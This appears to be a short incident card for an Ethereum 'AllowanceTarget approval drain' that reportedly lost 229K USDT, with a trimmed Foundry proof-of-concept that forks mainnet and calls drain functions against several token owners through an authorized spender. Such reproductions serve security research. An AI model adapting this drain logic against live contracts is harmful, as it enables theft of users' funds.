# [?] Unverified_a152 - AllowanceTarget approval drain

## Summary
Severity: Unknown
Chain: Ethereum
Component: unverified_a152
Published: 2026-04-27
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/unverified_a152_exp.sol
Type: defi-exploit-poc

## Details
Lost: 229K USDT

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 24_973_581;
        vm.createSelectFork("mainnet", forkBlock);

        fundingToken = USDT;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(AUTHORIZED_SPENDER, "Authorized Spending Contract");
        vm.label(SPENDER_HELPER, "Spender Helper");
        vm.label(ALLOWANCE_TARGET, "Allowance Target");
        vm.label(AAVE_POOL, "Aave V2 LendingPool");
        vm.label(CURVE_STETH_POOL, "Curve stETH Pool");
        vm.label(UNISWAP_V3_WETH_USDT, "Uniswap V3 WETH/USDT Pool");
        vm.label(USDT, "USDT");
        vm.label(AUSDT, "aUSDT");
        vm.label(STETH, "stETH");
        vm.label(WETH, "WETH");
    }

    function testExploit() public balanceLog {
        uint256 attackerUsdtBefore = IERC20(USDT).balanceOf(ATTACKER);

        AttackCoordinator coordinator = new AttackCoordinator();
        vm.label(address(coordinator), "Local Attack Coordinator");
        uint256 expectedStableExposure = stableTokenExposure();

        // step 1: execute the vulnerable allowance-spending path as the historical authorized spender.
        drainTo(address(coordinator), AUSDT_USDT_OWNER, AUSDT, true);
        drainUsdt(address(coordinator), AUSDT_USDT_OWNER);
        drainUsdt(address(coordinator), USDT_OWNER_TWO);
        drainUsdt(address(coordinator), USDT_OWNER_THREE);
        drainUsdt(address(coordinator), USDT_OWNER_FOUR);
        drainUsdt(address(coordinator), USDT_OWNER_FIVE);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/unverified_a152_exp.sol_
